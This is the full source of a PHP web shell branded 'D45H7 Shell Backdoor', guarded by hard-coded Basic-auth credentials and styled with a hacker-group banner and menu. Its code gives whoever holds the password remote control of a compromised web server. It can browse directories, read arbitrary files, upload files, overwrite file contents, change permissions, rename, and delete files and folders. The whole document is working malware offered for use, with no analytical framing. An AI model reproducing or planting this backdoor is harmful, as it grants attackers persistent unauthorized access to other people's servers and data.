<?php

$user = "D45H7";

$pass = "D45H734M";

 if (($_SERVER["PHP_AUTH_USER"] != $user) || (($_SERVER["PHP_AUTH_PW"]) != $pass))

 { 

  header("WWW-Authenticate: Basic realm=\"D45H 734M Was Here !!!\""); 

  header("HTTP/1.0 401 Unauthorized"); 

  exit(); 

 }

set_time_limit(0);
error_reporting(0);

if(get_magic_quotes_gpc()){
foreach($_POST as $key=>$value){
$_POST[$key] = stripslashes($value);
}
}
echo '<!DOCTYPE HTML>
<HTML>
<HEAD>
<meta charset="utf-8">
<link rel="SHORTCUT ICON" href="http://my.msk.co.com/uploads/1562509192.png">
<audio autoplay> <source src="http://www.soundescapestudios.com/SESAudio/SES%20Site%20Sounds/Beeps/Beeps-short-01.wav" type="audio/mpeg"></audio>
<link href="https://fonts.googleapis.com/css?family=Walter+Turncoat" rel="stylesheet">
<title>D45H7 Shell Backdoor</title>
<style>
* {
  border-radius:10px;
  overflow: scroll;
}
header {
   background-color: rgba(0,0,100, 0.5) ;
   border-top: 2px solid lime;
   border-left: 5px solid lime;
   border-right: 5px solid lime;
   border-bottom: 10px solid red;
   overflow: scroll;
   position: relative;
   }
.menu {
  height: 70px;
  width: 70px;
  right: 70px;
  top: 20px;
  color: lime;
  text-align: center;
  position: absolute;
  background: #ff0000;
  overflow: scroll;
  transition: all 0.2s ease;
  z-index: 999;
  border: 1px solid #c0c0c0;
}
.menu.active {
  width: calc(100% - 140px);
}
.menu.active .menuContent * {
  opacity: 1;
}
.menu.active span i:nth-child(1) {
  transform: rotate(-45deg) translate(-50%, -50%);
  top: 50%;
}
.menu.active span i:nth-child(2) {
  transform: translateX(-100px);
  opacity: 0;
}
.menu.active span i:nth-child(3) {
  transform: rotate(45deg) translate(-50%, -50%);
  top: 50%;
}
.menu span {
  width: 70px;
  height: 70px;
  position: absolute;
  right: 0;
  color: lime;
  border: 1px solid lime;
  cursor: pointer;
  background: #ff0000;
  z-index: 1;
}
.menu span i {
  position: absolute;
  transform-origin: 50% 50%;
  width: 45%;
  height: 2px;
  left: 0;
  right: 0;
  margin: auto;
  color: lime;
  background-color: #00ff00;
  transition: transform 0.3s ease, opacity 0.1s ease 0.1s;
}
.menu span i:nth-child(1) {
  top: 40%;
}
.menu span i:nth-child(2) {
  top: 50%;
}
.menu span i:nth-child(3) {
  top: 60%;
}
.menu .menuContent {
  position: absolute;
  width: 100%;
  height: 100%;
  line-height: 40px;
  right: 0px;
  text-align: center;
}
.menu .menuContent * {
  opacity: 0;
}
.menu .menuContent ul li {
  display: inline-block;
  margin-left: 50px;
  margin-right: 50px;
  color: #00ff00;
  outline: 2px solid lime;
  transition: opacity 0.3s ease 0.3s;
  cursor: pointer;
  position: relative;
}
.menu .menuContent ul li a {
  text-decoration:none;
  color: lime;
}
.menu .menuContent ul li:hover:before {
  opacity: 0.8;
  top: 13px;
  left: 20px;
}
.menu .menuContent ul li:hover:after {
  opacity: 0.8;
  bottom: 13px;
  left: -20px;
}
.menu .menuContent ul li:before, .menu .menuContent ul li:after {
  content: "*";
  position: absolute;
  width: 20px;
  height: 2px;
  background: #ccc;
  transition: all 0.3s ease;
}
.menu .menuContent ul li:before {
  transform: rotate(-55deg);
  left: 60px;
  top: -30px;
  opacity: 0;
  right: 0;
  margin: auto;
}
.menu .menuContent ul li:after {
  transform: rotate(-55deg);
  left: -60px;
  bottom: -30px;
  opacity: 0;
  right: 0;
  margin: auto;
}
body {
  background-color:black;
}
.begron {
   background-color: rgba(10,10,10, 0.5);
   position: relative;
   width: 95%;
   border: 1px solid;
   overflow:scroll;
   border-color:red;
   border-top: none;
   height: 20px;
   position:relative;
   transition: 1s ease-in;
}
.begron:hover {
  height:100%;
}
.judul-laman {
   background-color: rgba(10,10,10, 0.7);
   border: 2px solid #00ff00;
   border-bottom: none;
   color: red;
   overflow:hidden;
   outline: 1px solid red;
   bottom:0px;
   position: absolute;
   width: 200px;
   margin-right: 70%;
   margin-left: -15%;
}
.judul-laman:hover {
   outline: 1px dashed red;
}
th{
 border: 2px solid red;
 border-radius: 7px;
}
footer {
 position: fixed;
 bottom:0px;
 right:2px;
 color: lime;
 background-color:red;
 border:2px double #0000ff;
 border-radius:20px;
 transition: 2s ease-in;
}
foooter:hover{
  background-color:lime;
  color:red;
  width:0.5px;
}
table {
  color:red;
  background-color:rgba(0,100,0,0.5);
  border: 2px solid lime;
  border-radius:5px;
}
#content tr:hover{
background-color: transparant;
text-shadow:0px 0px 10px ##339900;
border:3px solid blue;
}
#content .first{
background-color: #000000;
}
#content .first:hover{
background-color: #ffffff;
text-shadow:0px 0px 1px #339900;
}
table{
border: 1px solid lime;
}
a{
color: lime;
text-decoration: none;
}
a:hover{
color: yellow;
text-shadow:0px 0px 10px #339900;
}
input,select,textarea{
border: 1px #ffff00 solid;
-moz-border-radius: 5px;
-webkit-border-radius:5px;
border-radius:5px;
}
</style>
</HEAD>
<BODY>
<center>
<header>
<img src="https://raw.githubusercontent.com/MrC3nd0l/MrC3nd0l.github.io/master/MOSHED-2019-9-24-13-28-28.gif" alt="logo D45H7" width="15%" align="left" style="border:1px solid #8A0000;margin-top:4px;margin-left:4px;padding:0.5px;">
<div class="menu">
<span class="toggle">
<i></i>
<i></i>
<i></i>
</span>
<div class="menuContent">
<ul>
<li><a href="//d45h3xploiter7.ga/">Home</a></li>
<li><a href="//d45h3xploiter7.ga/tools.html">Tools</a></li>
<li><a href="//d45h3xploiter7.ga/blog.html">Blog</a></li>
<li><a href="//d45h3xploiter7.ga/join.html">Join Us</a></li>
</ul>
<ul>
<li><a href="//d45h3xploiter7.ga/About-Us.html">About us</a></li>
<li><a href="//d45h3xploiter7.ga/CTF.html">C T F</a></li>
<li><a href="//d45h3xploiter7.ga/peraturan.html">Our Rules</a></li>
<li><a href="//d45h3xploiter7.ga/squad.html">Our Squad</a></li>
</ul>
<ul>
<li><a href="//d45h3xploiter7.ga/misi-tujuan.html" >Visi Misi</a></li>
<li><a href="//d45h3xploiter7.ga/partner.html" >Our Partner</a></li>
<li><a href="/other.html" >Lainnya</a></li>
</ul>
</div>
</div>

<script
src="https://code.jquery.com/jquery-3.3.1.js"
></script>
<script>
$(".toggle").on("click", function() {
$(".menu").toggleClass("active");
});

</script>
<br><br><br><center><font class="judul-laman">D45H7 SHELL</font></center>
</header>
<div class="begron">
<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr><td>Directory:~#  ';
if(isset($_GET['path'])){
$path = $_GET['path'];
}else{
$path = getcwd();
}
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);

foreach($paths as $id=>$pat){
if($pat == '' && $id == 0){
$a = true;
echo '<a href="?path=/">/</a>';
continue;
}
if($pat == '') continue;
echo '<a href="?path=';
for($i=0;$i<=$id;$i++){
echo "$paths[$i]";
if($i != $id) echo "/";
}
echo '">'.$pat.'</a>/';
}
echo '</td></tr><tr><td>';
if(isset($_FILES['file'])){
if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
echo '<font color="#ffffff">(!) Successfully Uploaded [√]</font><br />';
}else{
echo '<font color="red">(!) Upload Failed [×]</font><br />';
}
}
echo '<form enctype="multipart/form-data" method="POST"><input type="file" name="file" />
<input type="submit" value="Upload" />
</form>
</td></tr>';
if(isset($_GET['filesrc'])){
echo "<tr><td>files >> ";
echo $_GET['filesrc'];
echo '</tr></td></table><br />';
echo('<pre>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre>');
}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
if($_POST['opt'] == 'chmod'){
if(isset($_POST['perm'])){
if(chmod($_POST['path'],$_POST['perm'])){
echo '<font color="white">(!) Permission Changed [√]</font><br />';
}else{
echo '<font color="red">(!) Failed to set [×]</font><br />';
}
}
echo '<form method="POST">
Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="chmod">
<input type="submit" value="Lanjut" />
</form>';
}elseif($_POST['opt'] == 'rename'){
if(isset($_POST['newname'])){
if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
echo '<font color="white">(!) Name Changed [√]</font><br />';
}else{
echo '<font color="red">(!) Name Set Failed [×]</font><br />';
}
$_POST['name'] = $_POST['newname'];
}
echo '<form method="POST">
New Name : <input name="newname" type="text" size="3" value="'.$_POST['name'].'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="rename">
<input type="submit" value="Lanjut" />
</form>';
}elseif($_POST['opt'] == 'edit'){
if(isset($_POST['src'])){
$fp = fopen($_POST['path'],'w');
if(fwrite($fp,$_POST['src'])){
echo '<font color="white">(!) Successfully Edited [×]</font><br />';
}else{
echo '<font color="red">(!) Failed to Edit File [×]</font><br />';
}
fclose($fp);
}
echo '<form method="POST">
<textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="edit">
<input type="submit" value="Lanjut" />
</form>';
}
echo '</center>';
}else{
echo '</table><br /><center>';
if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
if($_POST['type'] == 'dir'){
if(rmdir($_POST['path'])){
echo '<font color="white">(!) Directory Killed [√]</font><br />';
}else{
echo '<font color="red">(!) Failed to Kill [×]</font><br />';
}
}elseif($_POST['type'] == 'file'){
if(unlink($_POST['path'])){
echo '<font color="white">(!) File Killed [√]</font><br />';
}else{
echo '<font color="red">(!) Failed to Kill [×]</font><br />';
}
}
}
echo '</center>';
$scandir = scandir($path);
echo '<div id="content"><table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr class="first">
<td><center>Name</center></td>
<td><center>Size</center></td>
<td><center>Permissions</center></td>
<td><center>Options</center></td>
</tr>';

foreach($scandir as $dir){
if(!is_dir("$path/$dir") || $dir == '.' || $dir == '..') continue;
echo "<tr>
<td><a href=\"?path=$path/$dir\">$dir</a></td>
<td><center>--</center></td>
<td><center>";
if(is_writable("$path/$dir")) echo '<font color="white">';
elseif(!is_readable("$path/$dir")) echo '<font color="red">';
echo perms("$path/$dir");
if(is_writable("$path/$dir") || !is_readable("$path/$dir")) echo '</font>';

echo "</center></td>
<td><center><form method=\"POST\" action=\"?option&path=$path\">
<select name=\"opt\">
<option value=\"\">What Would U Do?</option>
<option value=\"delete\">Delete</option>
<option value=\"chmod\">Change Perm.</option>
<option value=\"rename\">Rename</option>
</select>
<input type=\"hidden\" name=\"type\" value=\"dir\">
<input type=\"hidden\" name=\"name\" value=\"$dir\">
<input type=\"hidden\" name=\"path\" value=\"$path/$dir\">
<input type=\"submit\" value=\"X\" />
</form></center></td>
</tr>";
}
echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
foreach($scandir as $file){
if(!is_file("$path/$file")) continue;
$size = filesize("$path/$file")/1024;
$size = round($size,3);
if($size >= 1024){
$size = round($size/1024,2).' MB';
}else{
$size = $size.' KB';
}

echo "<tr>
<td><a href=\"?filesrc=$path/$file&path=$path\">$file</a></td>
<td><center>".$size."</center></td>
<td><center>";
if(is_writable("$path/$file")) echo '<font color="white">';
elseif(!is_readable("$path/$file")) echo '<font color="red">';
echo perms("$path/$file");
if(is_writable("$path/$file") || !is_readable("$path/$file")) echo '</font>';
echo "</center></td>
<td><center><form method=\"POST\" action=\"?option&path=$path\">
<select name=\"opt\">
<option value=\"Action\">What Would U Do?</option>
<option value=\"delete\">Kill'em</option>
<option value=\"chmod\">Change Perm.</option>
<option value=\"rename\">Rename</option>
<option value=\"edit\">Edit</option>
</select>
<input type=\"hidden\" name=\"type\" value=\"file\">
<input type=\"hidden\" name=\"name\" value=\"$file\">
<input type=\"hidden\" name=\"path\" value=\"$path/$file\">
<input type=\"submit\" value=\"X\" />
</form></center></td>
</tr>";
}
echo '</table>
</div><footer>©2020 D45H7</footer>';
}
echo '
</BODY>
</HTML>';
function perms($file){
$perms = fileperms($file);

if (($perms & 0xC000) == 0xC000) {
$info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
$info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
$info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
$info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
$info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
$info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
$info = 'p';
} else {
$info = 'u';
}

$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
(($perms & 0x0800) ? 's' : 'x' ) :
(($perms & 0x0800) ? 'S' : '-'));

$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
(($perms & 0x0400) ? 's' : 'x' ) :
(($perms & 0x0400) ? 'S' : '-'));

$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
(($perms & 0x0200) ? 't' : 'x' ) :
(($perms & 0x0200) ? 'T' : '-'));

return $info;
}
?>